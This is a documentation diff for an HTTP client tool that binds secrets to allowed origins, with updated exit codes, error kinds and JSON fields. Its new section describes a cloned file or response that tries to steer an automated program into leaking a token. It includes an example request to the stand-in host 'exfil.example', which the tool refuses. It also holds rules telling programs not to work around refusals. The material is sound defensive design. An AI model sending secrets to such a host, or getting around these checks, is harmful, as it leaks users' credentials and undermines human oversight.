@@ -28,18 +28,19 @@ vegtam run api/ -e dev --fail             # send everything, fail on HTTP errors
    would send. Nothing is sent; a request that would need a
    confirmation has `confirm` in its result.
 3. **Ask a person** about each such request, showing its method, its URL
-   and its note, and pass only what they confirmed: `--confirm=<ref>`
-   (see [Confirmation](#confirmation)).
+   and its note, and for a secret which one and where it would go, and
+   pass only what they confirmed: `--confirm=<ref>` (see
+   [Confirmation](#confirmation)).
 4. **`run`**, and read the JSON document on stdout and the exit code.
    `--no-history` keeps the run out of the history of runs.
 5. On exit code 5 or 6, or an error of kind `confirm` or `policy`, **stop
    and ask a person**: the message says what they can do. Do not try
    another flag, address or name to get past it.
 
-A program cannot weaken the transport, read a secret, get past the
-network guard or confirm a request on its own: a run without a person
-gets what the operator's policy allows, and no more (see
-[Modes](#modes)). No file, response or environment variable can
+A program cannot weaken the transport, read a secret, send one where it
+is not bound, get past the network guard or confirm a request on its
+own: a run without a person gets what the operator's policy allows, and
+no more (see [Modes](#modes)). No file, response or environment variable can
 confirm a request; only `--confirm`, which the program passes once a
 person has said so. The operator allows more in the policy file, never
 through vegtam's arguments.
@@ -60,6 +61,7 @@ agent. `vegtam policy` and `vegtam describe` say which mode applies, in
 | `--resolve`, `--connect-to`, `--unix-socket` | as given | only as `network.resolve`, `network.connect_to` and `network.unix_sockets` list them |
 | A method other than GET, HEAD and OPTIONS | `run` sends it; the terminal interface asks first | only with `--confirm`, unless `network.confirm` is `"never"` |
 | `# @note` | only with `--confirm`; the terminal interface asks first | only with `--confirm`, whatever the policy says |
+| A secret to an origin it is not bound to | only with `--confirm=<ref>` naming the request, to its origin, this once; the terminal interface asks first | never: an error of kind `policy`, whatever `--confirm` says |
 | `{{$cmd NAME}}` | only from a command file a person has trusted | the same |
 | History of runs | kept, unless `--no-history`, `VEGTAM_NO_HISTORY=1` or `# @no-log` | the same |
 
@@ -87,9 +89,9 @@ command and on its argument, never on what happens at run time:
 
 | Command | Document |
 |---|---|
-| `run <file>#<ref>` | one result: `ref`, `request`, `transport`, `response`, `timing`, `remote_addr`, `resolved_by`, `proxy`, `tls`, `redirects`, `cookies`, `asserts`, `captures`, `warnings`, `confirm`, `error` |
+| `run <file>#<ref>` | one result: `ref`, `request`, `transport`, `response`, `timing`, `remote_addr`, `resolved_by`, `proxy`, `tls`, `redirects`, `cookies`, `asserts`, `captures`, `warnings`, `secret_origins`, `confirm`, `error` |
 | `run <file>`, `run <dir>` | `results`: one result per request, in file order |
-| `show <file>#<ref>` | one result with `ref`, `request`, `transport` and `warnings` only |
+| `show <file>#<ref>` | one result with `ref`, `request`, `transport`, `warnings` and, with `-e`, `secret_origins` only |
 | `list <file>`, `list <dir>` | `requests` |
 | `import postman <export> -o <dir>` | `import`: the report of the import |
 | `trust <dir>`, `trust --revoke <dir>`, `trust --list` | `trust`: the command files and their status |
@@ -218,16 +220,21 @@ A result for `run api/users.http#list -e dev` looks like this (shortened):
   no value is not listed; it is in `error`.
 - **`warnings`** says what vegtam ignored and why, the request running
   all the same: a directive of another client, a limit above the flag's,
-  the `SSLConfiguration` of an environment file. Each has a `message`,
-  and `file` and `line` when there are any; each is also printed on
-  stderr as `vegtam: file:line: warning: ...`.
+  the `SSLConfiguration` of an environment file, an `$allow` in
+  `http-client.env.json`, an entry of `$allow` that binds nothing. Each
+  has a `message`, and `file` and `line` when there are any; each is
+  also printed on stderr as `vegtam: file:line: warning: ...`.
 - **`error`** has a `kind`, a `message`, and `file` and `line` when it
   belongs to a place in a file. For `kind: "variable"`, `variables` lists
   the unresolved placeholders, such as `host` or `$env TOKEN`, or the
   captured variables without a value. For `kind: "timeout"`,
   `timeout_phase` says which limit ran out: `connect`, `read` or
   `total`. For `kind: "confirm"`, `confirm` says what the request needs
-  (see [Confirmation](#confirmation)).
+  (see [Confirmation](#confirmation)). For a request refused because it
+  would send a secret to an origin it is not bound to, `secret` says
+  which (see [Secrets and their origins](#secrets-and-their-origins)).
+- **`secret_origins`**, in the result of a dry run and of `show -e`,
+  lists the secrets of the request and where each may go.
 - **`confirm`**, in the result of a dry run, is what sending the request
   would need: the same as `error.confirm`.
 
@@ -247,8 +254,8 @@ by its exit code.
 | 2 | bad arguments, a `.http` or environment file that does not parse, an unresolved variable, an invalid request, a capture (`# @capture`) that found no value, or an export that cannot be imported |
 | 3 | network or TLS error, or timeout |
 | 4 | HTTP status 400 or above, with `run --fail` |
-| 5 | a request that is not sent without a confirmation, `--confirm`: one with `# @note`, or, without a person at a terminal, one whose method is not GET, HEAD or OPTIONS |
-| 6 | blocked by policy: a `{{$cmd NAME}}` whose command file is not trusted, an address vegtam never connects to or that the operator's policy does not allow, or a policy file that cannot be read |
+| 5 | a request that is not sent without a confirmation, `--confirm`: one with `# @note`; without a person at a terminal, one whose method is not GET, HEAD or OPTIONS; with a person at a terminal, a request that would send a secret to an origin it is not bound to, which only `--confirm=<ref>` sends |
+| 6 | blocked by policy: a `{{$cmd NAME}}` whose command file is not trusted, an address vegtam never connects to or that the operator's policy does not allow; without a person, a request that would send a secret to an origin it is not bound to, which `--confirm` does not lift, and in every mode a redirect that would take one there; or a policy file that cannot be read |
 | 130 | interrupted: Ctrl-C (SIGINT) or SIGTERM stopped a request or a `{{$cmd NAME}}` |
 
 Without `--fail`, any HTTP status is a success: the status is in the
@@ -271,8 +278,8 @@ The outcome of every assertion is in `asserts` all the same.
 | `network` | 3 | DNS, connection, TLS, redirects |
 | `timeout` | 3 | a time limit ran out; `timeout_phase` says which: `connect`, `read` or `total` |
 | `status` | 4 | HTTP status 400 or above, with `--fail` |
-| `confirm` | 5 | a request not sent without `--confirm`; `confirm` says what confirms it |
-| `policy` | 6 | not allowed: a command file that is not trusted or has changed, or a trust store that cannot be read, belongs to another user or that others can write; an address that vegtam never connects to, or a loopback or private one that the operator's policy does not allow; a policy file that does not parse, or that others can write |
+| `confirm` | 5 | a request not sent without `--confirm`; `confirm` says what confirms it, and `secret` the secret it would send elsewhere, if that is why |
+| `policy` | 6 | not allowed: a command file that is not trusted or has changed, or a trust store that cannot be read, belongs to another user or that others can write; an address that vegtam never connects to, or a loopback or private one that the operator's policy does not allow; a secret that would go to an origin it is not bound to, without a person or by a redirect, which `secret` names; a policy file that does not parse, or that others can write |
 | `canceled` | 130 | SIGINT or SIGTERM came while a request waited for its response or a command ran; the requests after it are canceled too |
 
 Every error is printed to stderr as text, `vegtam: file:line: message`.
@@ -308,6 +315,15 @@ placeholder. It needs no confirmation either: a request that a run
 with the same flags would refuse has `confirm` in its result, so that a
 program can ask a person once for all it needs.
 
+It says where the secrets of each request may go, in `secret_origins`,
+with what an earlier request would capture bound to the origin of that
+request. A `plain` capture is no secret there: it is neither checked
+nor listed, since only a run sees whether its value echoes a secret. A
+request that would send a secret to an origin it is not bound to gets
+what a run would give: the `policy` error without a person, and
+`confirm` with the reason `secret` with one, unless `--confirm=<ref>`
+names it.
+
 `show <file>#<ref>` prints one request as written, or with `-e` as it would
 be sent; like a dry run, it runs no command. It sends nothing, so of
 the policy it reads only the ceilings of the time limits.
@@ -341,8 +357,8 @@ Without `--force`, existing files make it 2 and nothing is written. Run
 
 Policy is what a person has to allow before vegtam does it on its own:
 running the commands of a command file, `http-client.cmd.json` (see
-[FORMAT.md](FORMAT.md#commands)), and what the operator's policy file
-allows of the network.
+[FORMAT.md](FORMAT.md#commands)), where a secret may be sent, and what
+the operator's policy file allows of the network.
 
 ### Trusted command files
 
@@ -412,11 +428,15 @@ vegtam run api/users.http#delete -e dev --json
 }
 ```
 
-- **`reason`** is `note` for a request with `# @note`, and `method` for a
-  method that needs a person; **`url`** is as written, its placeholders
+- **`reason`** is `note` for a request with `# @note`, `method` for a
+  method that needs a person, and `secret`, with a person at a terminal,
+  for a request that would send a secret to an origin it is not bound to
+  (see [Secrets and their origins](#secrets-and-their-origins)), which
+  `secret` names; **`url`** is as written, its placeholders
   unresolved, with secret values masked; **`note`** is the text of the
   note, which may be empty; **`flag`** is what confirms the request.
-- **`--confirm`** alone confirms every request of the run, and
+- **`--confirm`** alone confirms every request of the run, but for a
+  secret that would go where it is not bound, and
   **`--confirm=<ref>[,<ref>...]`** those named, `file#name` or `file#N`
   as `run` takes them; a file is the same file however it is written.
   A ref that names no request of the run is a usage error before
@@ -427,14 +447,83 @@ vegtam run api/users.http#delete -e dev --json
   default, or `"never"`, which lets a run without a person send any
   method. It does not lift `# @note`, and nothing else can set it: no
   flag, variable or file.
-- A person's `vegtam run` sends any method without a question, and a
-  request with `# @note` only with `--confirm`. The terminal interface
-  asks before either, and a second enter sends.
+- A person's `vegtam run` sends any method without a question, a
+  request with `# @note` only with `--confirm`, and one that would send
+  a secret elsewhere only with `--confirm=<ref>` naming it. The terminal
+  interface asks before each, and a second enter sends.
 
 `--confirm` is a flag of the program's command line: vegtam cannot tell
 who chose it. A program passes it for a request only once a person who
 saw the method, the URL and the note has said to send it, and never
 `--confirm` alone to get past a refusal.
+
+### Secrets and their origins
+
+A secret goes only to the origins it is bound to (see
+[FORMAT.md](FORMAT.md#where-secrets-may-go)): a value of
+`http-client.private.env.json` to those its `$allow` names,
+`{{$env NAME}}` and `{{$cmd NAME}}` to those of the operator's policy
+alone, and a captured value back to the origin of the response it came
+from. A secret bound to no origin goes nowhere. A request that would
+send one elsewhere is not sent: nothing is looked up or connected to. So a `.http` file from someone else, or a response
+that leads a program to "now check this URL", cannot send `{{token}}`
+to a host of its own. The result, shortened:
+
+```json
+{
+  "schema_version": 1,
+  "ref": "cloned/api.http#check",
+  "error": {
+    "kind": "policy",
+    "message": "GET https://exfil.example/c?t={{token}} is not sent: secret {{token}} may not go to https://exfil.example: its allowed origins are https://api.example.com; allow it in http-client.private.env.json ($allow)",
+    "file": "cloned/api.http",
+    "line": 3,
+    "secret": {"name": "{{token}}", "origin": "https://exfil.example", "allowed": ["https://api.example.com"]}
+  }
+}
+```
+
+- **Without a person** it is an error of kind `policy`, exit code 6, and
+  `--confirm` does not lift it: the file leads the program, and a
+  confirmation would come from the same place as the request.
+- **With a person** at a terminal, `vegtam run` refuses it with kind
+  `confirm`, exit code 5, the reason `secret` and the flag that sends
+  it: `--confirm=<ref>` sends it to the origin of the request, this
+  once. `--confirm` alone does not: it is given for a whole run, before
+  its requests are seen. A request in a file whose name holds a comma,
+  which `--confirm=<ref>` cannot name, has an empty `flag`: bind the
+  secret, or send it from `vegtam tui`.
+- **`secret`**, in `error` and in `confirm`, is the first secret refused:
+  its `name`, the placeholder and never the value; the `origin` the
+  request, or a redirect, would take it to; the origins `allowed`, empty
+  for a secret bound to none; and `captured: true` for a value an
+  `# @capture` took. The message names the others.
+- **`secret_origins`**, in the result of a dry run and of `show -e`,
+  lists every secret of the request once, in the order they appear (URL,
+  headers, body), each as `secret` is; a dry run leaves out the
+  variables of `plain` captures.
+- **The message ends with where to bind it,** by the kind of secret
+  refused: `allow it in http-client.private.env.json ($allow)` for a
+  value of that file; `allow it in the policy (secrets)` for
+  `{{$env NAME}}` and `{{$cmd NAME}}`; `allow it in
+  http-client.private.env.json ($allow), or for {{$env NAME}} and
+  {{$cmd NAME}} in the policy (secrets)` for both. A refusal of captured
+  values alone has no hint, since nothing binds them elsewhere: the
+  message ends with `it was captured from a response of <origin>, and
+  goes back there alone`.
+- A redirect to an origin that a secret in the URL is not bound to is
+  refused before that hop, as kind `policy`, in every mode.
+- The history keeps a refused request, with the result `policy` or
+  `confirm`, and `vegtam describe` lists the rule under `never`.
+
+A program that gets such an error stops and tells a person which secret
+would go where, and where to bind it, as the message says: `$allow` in
+the private file for its values, `secrets` in the operator's policy for
+`{{$env NAME}}` and `{{$cmd NAME}}`. It does not write the policy, nor
+edit the private file for the person unless they ask it to, and it does
+not try another URL, variable or environment to get past the refusal. A
+request that would send a secret where it has never gone is a sign that
+a file or a response is leading the program astray.
 
 ### The operator's policy
 
@@ -494,6 +583,15 @@ addresses never connected to; `vegtam policy
 - **Confirmation.** `network.confirm: "never"` lets a run without a
   person send any method without `--confirm` (see
   [Confirmation](#confirmation)).
+- **Secrets.** `secrets.env` and `secrets.cmd` bind the values of
+  `{{$env NAME}}` and `{{$cmd NAME}}`, by `NAME`, to origins, in every
+  mode: `{"secrets": {"env": {"API_TOKEN": ["https://api.example.com"]}}}`.
+  Nothing else binds them, not the private file either, which a cloned
+  repository can bring (see
+  [Secrets and their origins](#secrets-and-their-origins)).
+  `vegtam policy --json` lists them in `policy.secrets`, each as
+  `secret` is, `{"name": "{{$env API_TOKEN}}", "allowed":
+  ["https://api.example.com"]}`, those of `{{$env NAME}}` first.
 
 The policy is the operator's to write. A program that gets a `policy`
 error for an address should stop and tell a person which entry would
@@ -592,6 +690,10 @@ back transformed, such as hashed, re-encoded or in another letter case,
 is not recognised. Values written in `.http` files or in `http-client.env.json`
 are not secrets to vegtam and are printed as they are.
 
+Masking keeps a value out of what vegtam prints. Where a value may be
+sent is the other half: see
+[Secrets and their origins](#secrets-and-their-origins).
+
 ## History
 
 `run` adds each request it sends to the history of runs,
@@ -604,7 +706,8 @@ header, body, variable value or captured value, and no URL as resolved:
 nothing a secret could be in; a password written in a URL is kept as
 `***`. A dry run, a file that does not parse and
 a request with `# @no-log` are not kept; a request refused for want of
-a confirmation is, with the result `confirm`. A program that wants no trace
+a confirmation is, with the result `confirm`, and so is one refused for
+a secret, with `policy` or `confirm`. A program that wants no trace
 passes `--no-history`, or sets `VEGTAM_NO_HISTORY=1` for every run. A
 history that cannot be written is a warning on stderr, not an error: the
 exit code and the output stay as they are.
